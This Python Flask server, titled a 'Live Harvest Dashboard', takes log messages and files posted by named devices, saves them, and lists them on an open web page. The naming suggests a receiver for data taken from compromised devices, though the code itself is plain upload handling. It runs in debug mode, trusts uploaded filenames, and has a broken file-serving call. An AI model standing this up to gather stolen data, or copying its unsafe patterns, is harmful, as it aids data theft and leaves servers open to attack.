from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
harvest_logs = []

@app.route('/', methods=['GET'])
def dashboard():
    return render_template_string('''
        <h2>Live Harvest Dashboard</h2>
        <table border=1>
          <tr><th>Time</th><th>Device</th><th>Log/Event</th></tr>
          {% for entry in logs %}
          <tr>
            <td>{{ entry.time }}</td>
            <td>{{ entry.device }}</td>
            <td>{{ entry.log }}</td>
          </tr>
          {% endfor %}
        </table>
        <h3>Uploaded Files</h3>
        <ul>
        {% for fname in files %}
          <li><a href="/uploads/{{fname}}" target="_blank">{{ fname }}</a></li>
        {% endfor %}
        </ul>
    ''', logs=harvest_logs[-100:], files=os.listdir(UPLOAD_FOLDER))

@app.route('/upload', methods=['POST'])
def upload():
    device = request.form.get('device', 'Unknown')
    logmsg = request.form.get('log', '')
    t = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    harvest_logs.append(dict(time=t, device=device, log=logmsg))
    if 'file' in request.files:
        file = request.files['file']
        filename = f"{device}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        harvest_logs.append(dict(time=t, device=device, log=f"Uploaded file: {filename}"))
    return 'OK'

@app.route('/uploads/<path:filename>')
def files(filename):
    return app.send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(debug=True)
